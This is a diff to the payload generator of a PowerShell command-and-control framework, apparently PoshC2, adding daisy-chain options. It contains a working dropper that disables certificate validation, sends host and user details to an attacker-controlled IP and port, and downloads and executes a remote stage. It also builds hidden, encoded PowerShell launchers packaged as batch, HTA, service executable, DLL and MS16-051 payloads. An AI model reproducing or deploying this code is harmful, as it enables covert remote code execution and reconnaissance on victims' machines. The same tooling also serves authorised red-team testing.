@@ -1,31 +1,13 @@
 ﻿ #dropper
- function createdropper($killdate, $domainfrontheader, $ipv4address, $serverport, $username, $password, $proxyurl) {
-$oldcommand = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-function Get-Webclient ($Cookie) {
-$d = (Get-Date -Format "dd/MM/yyyy");
-$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
-$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
-if ($k -lt $d) {exit} 
-$wc = New-Object System.Net.WebClient; 
-$wc.UseDefaultCredentials = $true; 
-$wc.Proxy.Credentials = $wc.Credentials;
-$h="'+$domainfrontheader+'"
-if ($h) {$wc.Headers.Add("Host",$h)}
-$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
-if ($cookie) {
-$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
-} $wc }
-function primer {
-if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
-$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;'+$ipv4address+'")
-$p64 = [Convert]::ToBase64String($pre)
-$pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
-$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
-$pm } 
-$pm = primer
-if ($pm) {$pm| iex} else {
-start-sleep 10
-primer | iex }'
+ function createdropper($killdate, $domainfrontheader, $ipv4address, $serverport, $username, $password, $proxyurl, $Daisy) {
+
+if ($Daisy) { 
+    $connect="daisy"
+    $proxynone = "if (!`$proxyurl){`$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
+} else { 
+    $proxynone = ""
+    $connect="connect" 
+}
 
 $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 function Get-Webclient ($Cookie) {
@@ -36,7 +18,8 @@ if ($k -lt $d) {exit}
 $username = "'+$username+'"
 $password = "'+$password+'"
 $proxyurl = "'+$proxyurl+'"
-$wc = New-Object System.Net.WebClient;  
+$wc = New-Object System.Net.WebClient; 
+'+$proxynone+'
 $h="'+$domainfrontheader+'"
 if ($h) {$wc.Headers.Add("Host",$h)}
 $wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
@@ -55,7 +38,7 @@ $wc } function primer {
 if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
 $pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;'+$ipv4address+'")
 $pretext64 = [Convert]::ToBase64String($pretext)
-$primer = (Get-Webclient -Cookie $pretext64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
+$primer = (Get-Webclient -Cookie $pretext64).downloadstring("'+$ipv4address+":"+$serverport+'/'+$connect+'")
 $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
 $primer } 
 $primer = primer
@@ -156,10 +139,12 @@ function cs_sct
 }
 
 # create exe 
-function CreateStandAloneExe($Proxy) 
+function CreateStandAloneExe($Proxy, $DaisyName) 
 {
 if ($Proxy) {
     $Name = "ProxyPosh"
+} elseif ($DaisyName) {
+    $Name = "DaisyPosh_$($DaisyName)"
 } else {
     $Name = "Posh"
 }
@@ -293,13 +278,15 @@ Write-Host -Object "DotNetToJS Created .js Payload written to: $global:newdir\pa
 
 
 # create service exe 
-function CreateServiceExe($Proxy)
+function CreateServiceExe($Proxy, $DaisyName)
 {
 if ($Proxy) {
     $Name = "ProxyPoshService"
+} elseif ($DaisyName) {
+    $Name = "DaisyPoshService_$($DaisyName)"
 } else {
     $Name = "PoshService"
-}
+} 
 $bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
 $praw = [Convert]::ToBase64String($bytescom)
 $cscservicecode = 'using System;
@@ -523,7 +510,6 @@ UpdateMacro'
 # create HTA payload
 function CreateHTAPayload
 {
-    
     $bytes = [Text.Encoding]::Unicode.GetBytes($command)
     $payloadraw = '-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
@@ -551,7 +537,6 @@ function CreateHTAPayload
 # create MS16-051 payload
 function Create-MS16-051-Payload
 {
-    
     $poshexec = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
     $bytes = [Text.Encoding]::Unicode.GetBytes($command)
     $payloadraw = ' "-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
@@ -806,13 +791,15 @@ Write-Host -Object "Java Payload written to: $global:newdir\JavaPS.jar and apple
 }
 
 # create bat payloads
-function CreatePayload($Proxy)
+function CreatePayload($Proxy, $DaisyName)
 {
     if ($Proxy) {
         $Name = "ProxyPayload"
+    } elseif ($DaisyName) {
+        $Name = "DaisyPayload_$($DaisyName)"
     } else {
         $Name = "Payload"
-    }
+    } 
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
     $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
@@ -837,9 +824,11 @@ function CreateLink
 
     Write-Host -Object "LNK Payload written to: $DestinationPath" -ForegroundColor Green
 }
-function CreateDLL($Proxy) {
+function CreateDLL($Proxy, $DaisyName) {
     if ($Proxy) {
         $Name = "ProxyPosh"
+    } elseif ($DaisyName) {
+        $Name = "DaisyPosh_$($DaisyName)"
     } else {
         $Name = "Posh"
     } 
